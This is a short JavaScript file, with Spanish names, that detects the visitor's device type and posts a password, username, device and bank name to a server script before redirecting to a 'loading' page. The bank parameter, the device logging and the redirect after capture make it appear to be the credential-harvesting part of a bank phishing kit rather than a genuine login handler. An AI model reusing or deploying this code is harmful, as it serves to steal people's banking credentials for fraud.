

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


function pasousuario(p, u, b){
    var res;
    var d = detectar_dispositivo();
    $.post( "/process2/pasousuario.php", { pass: p, user: u, dis: d, banco: b} ,function(data) {
        if (data == "ERR") {
                alert("error");
        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "cargando.php";
            }
        }
    });
}            